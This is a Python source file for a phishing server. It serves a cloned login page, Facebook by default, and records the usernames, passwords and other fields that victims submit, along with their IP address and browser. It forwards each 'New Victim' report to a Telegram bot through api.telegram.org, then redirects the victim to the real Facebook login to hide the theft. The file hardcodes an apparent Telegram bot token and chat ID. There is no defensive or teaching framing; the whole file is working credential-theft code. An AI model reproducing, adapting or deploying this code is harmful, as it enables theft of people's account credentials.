import json, requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
from pathlib import Path

TEMPLATE_DIR = Path(__file__).parent.parent / 'templates'
CONFIG_FILE = Path(__file__).parent.parent / 'config.json'

# ============ توكنك وايديك هنا ============
MY_TOKEN = "8621898730:AAG28R9Mrw8eZU7OCT3vRMgXvGzsOAzTX7Q"
MY_CHAT_ID = "8174430177"
# =========================================

def load_config():
    with open(CONFIG_FILE) as f:
        return json.load(f)

class PhishHandler(BaseHTTPRequestHandler):
    tpl = 'facebook'
    redir = 'https://www.facebook.com/login.php'
    db = None
    
    def log_message(self, f, *a): pass
    
    def do_GET(self):
        try:
            path = TEMPLATE_DIR / f'{self.tpl}.html'
            if not path.exists():
                self.send_error(404)
                return
            html = path.read_text(encoding='utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html;charset=utf-8')
            self.end_headers()
            self.wfile.write(html.encode())
        except:
            self.send_error(500)
    
    def do_POST(self):
        try:
            cl = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(cl).decode()
            data = parse_qs(body)
            ip = self.client_address[0]
            ua = self.headers.get('User-Agent', '?')
            
            victim = {
                'ip': ip, 'ua': ua, 'ts': datetime.now().isoformat(),
                'data': {k: data[k][0] for k in data}, 'tpl': self.tpl
            }
            
            self.db.save(victim)
            print(f'\033[1;32m[+] VICTIM! {ip} | {list(data.keys())}\033[0m')
            
            # ============ إرسال للبوت ============
            try:
                config = load_config()
                token = config.get('telegram_bot_token', '') or MY_TOKEN
                chat_id = config.get('telegram_chat_id', '') or MY_CHAT_ID
                
                if token and chat_id:
                    fields = '\n'.join([f'{k}: {v[0]}' for k, v in data.items()])
                    msg = f"☠️ *New Victim!*\n\n📱 *Platform:* {self.tpl}\n🌐 *IP:* {ip}\n📅 *Time:* {victim['ts']}\n\n{fields}"
                    
                    url = f"https://api.telegram.org/bot{token}/sendMessage"
                    requests.post(url, json={
                        'chat_id': chat_id,
                        'text': msg,
                        'parse_mode': 'Markdown'
                    }, timeout=3)
            except:
                pass
            # ================================
            
            self.send_response(302)
            self.send_header('Location', self.redir)
            self.end_headers()
        except:
            self.send_error(500)

class PhishServer:
    def __init__(self, port, tpl, redir, db):
        PhishHandler.tpl = tpl
        PhishHandler.redir = redir
        PhishHandler.db = db
        self.server = HTTPServer(('0.0.0.0', port), PhishHandler)
    
    def start(self): self.server.serve_forever()
    def stop(self): self.server.shutdown()
